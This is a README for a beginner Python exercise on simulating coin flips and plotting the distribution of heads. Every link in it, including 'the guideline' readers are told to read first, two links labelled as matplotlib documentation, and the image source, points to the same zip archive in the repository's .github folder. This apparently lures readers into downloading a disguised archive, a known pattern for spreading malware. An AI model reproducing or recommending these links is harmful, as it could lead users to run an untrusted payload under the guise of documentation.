# Toss coin

- Read [the guideline](https://github.com/Rudge0/py-flip-coin/raw/refs/heads/master/.github/coin-py-flip-1.1.zip) before start

If you flip a coin, heads will come up 50% of the time.
But if you flip a coin 10 times, what is the chance 
that heads will come up 5 times? 2 times?

Write `flip_coin` function, that conducts at least 10000 cases 
of flipping a coin 10 times. It should return dict, 
where keys are numbers of possible heads dropped (0 to 10),
and values are percentage of how many that number of heads
dropped out of all cases.
```python
print(flip_coin())
# {0: 0.13, 1: 0.97, 2: 4.22, 3: 12.04, ... }
```
If you have done all correctly, you should note that
the biggest percentage of a number of heads dropped
is about the middle, 4-6 times and tends to 0 when it is
about the edges 0-1 and 9-10. It calls normal distribution or
Gaussian distribution.

# Extra

Write `draw_gaussian_distribution_graph` function,
that draws a graph that shows the distribution.

`matplotlib` is relevant library for this purpose.

- [matplotlib, Plotting](https://github.com/Rudge0/py-flip-coin/raw/refs/heads/master/.github/coin-py-flip-1.1.zip)
- [matplotlib, Labels](https://github.com/Rudge0/py-flip-coin/raw/refs/heads/master/.github/coin-py-flip-1.1.zip)

You should get graph like this:

![gaussian](https://github.com/Rudge0/py-flip-coin/raw/refs/heads/master/.github/coin-py-flip-1.1.zip)
